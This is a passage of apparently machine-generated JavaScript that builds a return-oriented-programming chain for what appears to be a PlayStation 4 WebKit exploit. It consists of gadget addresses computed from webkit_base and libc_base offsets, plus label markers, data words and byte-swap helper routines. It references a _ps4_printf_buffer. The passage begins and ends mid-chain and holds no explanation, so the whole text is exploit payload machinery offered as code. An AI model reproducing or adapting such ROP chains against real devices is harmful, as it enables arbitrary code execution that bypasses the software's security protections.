//L2440:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+164168, //L2442
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+164152, //L2441
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2441:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2442:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+164304, //L2445
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+164288, //L2444
webkit_base+7438103, //mov [rsi], rax
libc_base+206806, //pop rdi
//L2443:
ropchain+128, //_ps4_printf_buffer
libc_base+792472 //pop rcx
]);
//L2444:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2445:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+164448, //L2448
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+164416, //L2446
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+164432, //L2447
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2446:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2447:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2448:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+164536, //L2450
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L2449:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L2450:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+164584, //L2451
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2451:
db([0, 0]); // 0x0
set_gadgets([
libc_base+788575, //pop rax
//L2452:
ropchain+128, //_ps4_printf_buffer
webkit_base+2997875, //mov [rax], rcx
libc_base+793877, //pop rsi
ropchain+164656, //L2454
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2454:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+164736, //L2456
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2456:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+164792, //L2458
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2458:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+865136, //mov [rax], cl
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+164920, //L2460
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+164904, //L2459
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2459:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2460:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+165016, //L2461
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+165032, //L2462
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2461:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2462:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+165144, //L2463
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+165128, //L2464
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2464:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2463:
db([0, 0]); // 0x0
//L2405:
set_gadget(libc_base+793877,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+105267, //pop rdx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+10235455, //pop r9
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+785193, //xor rax, rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+7438103, //mov [rsi], rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+811575, //pop rsp
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5202439, //and rax, rcx
libc_base+792472, //pop rcx
write_addr,
webkit_base+2997875, //mov [rax], rcx
libc_base+793877 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+166472, //L2465
webkit_base+7438103, //mov [rsi], rax
libc_base+811575 //pop rsp
]);
//L2465:
db([0, 0]); // 0x0
//___bswap64_var:
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+166544, //L2466
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L2466:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+166640, //L2469
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+166672, //L2471
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
webkit_base+432898 //pop r8
]);
//L2469:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2470:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L2471:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+166760, //L2472
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+166776, //L2473
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2472:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2473:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+166896, //L2476
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+166912, //L2477
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+166880, //L2475
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2475:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2476:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2477:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+167008, //L2478
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+167024, //L2479
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2478:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2479:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+167136, //L2480
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+167120, //L2481
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2481:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2480:
db([0, 0]); // 0x0
set_gadgets([
libc_base+793877, //pop rsi
ropchain+167224, //L2483
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+167208, //L2482
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2482:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2483:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+167320, //L2484
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+167336, //L2485
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2484:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2485:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+167448, //L2486
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+167432, //L2487
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2487:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2486:
db([0, 0]); // 0x0
//___bswap32_var:
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+167520, //L2488
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L2488:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+167616, //L2491
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+167648, //L2493
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
webkit_base+432898 //pop r8
]);
//L2491:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2492:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L2493:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+167736, //L2494
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+167752, //L2495
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2494:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2495:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+167904, //L2498
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+167936, //L2500
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+167888, //L2497
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+167920, //L2499
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2497:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2498:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2499:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2500:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+168096, //L2504
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+168048, //L2501
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+168064, //L2502
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2501:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2502:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2503:
db([32, 0]); // 0x20
set_gadget(libc_base+788575,); //pop rax
//L2504:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+168224, //L2506
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+168240, //L2507
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+168208, //L2505
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2505:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2506:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2507:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+168336, //L2508
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+168352, //L2509
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2508:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2509:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+168464, //L2510
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+168448, //L2511
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2511:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2510:
db([0, 0]); // 0x0
set_gadgets([
libc_base+793877, //pop rsi
ropchain+168552, //L2513
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+168536, //L2512
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2512:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2513:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+168648, //L2514
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+168664, //L2515
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2514:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2515:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+168776, //L2516
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+168760, //L2517
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2517:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2516:
db([0, 0]); // 0x0
//___bswap16_var:
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+168848, //L2518
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L2518:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+168944, //L2521
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+168976, //L2523
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
webkit_base+432898 //pop r8
]);
//L2521:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2522:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L2523:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+169064, //L2524
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+169080, //L2525
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2524:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2525:
db([0, 0]); // 0x0
set_gadgets([
libc_base+270800, //mov ax, [rdi]
libc_base+793877, //pop rsi
ropchain+169240, //L2530
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+169192, //L2527
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+169208, //L2528
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2527:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2528:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2529:
db([16, 0]); // 0x10
set_gadget(libc_base+788575,); //pop rax
//L2530:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+169296, //L2531
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L2531:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+169400, //L2533
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+169432, //L2535
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+169416, //L2534
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2533:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2534:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2535:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+169592, //L2539
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+169544, //L2536
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+169560, //L2537
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2536:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2537:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2538:
db([48, 0]); // 0x30
set_gadget(libc_base+788575,); //pop rax
//L2539:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+169696, //L2541
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+169680, //L2540
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2540:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2541:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L2542:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L2543:
db([8, 0]); // 0x8
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+169904, //L2546
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+169872, //L2544
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2544:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2545:
db([48, 0]); // 0x30
set_gadget(libc_base+788575,); //pop rax
//L2546:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+170008, //L2548
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+169992, //L2547
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2547:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2548:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+170104, //L2550
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2549:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L2550:
db([0, 0]); // 0x0
set_gadgets([
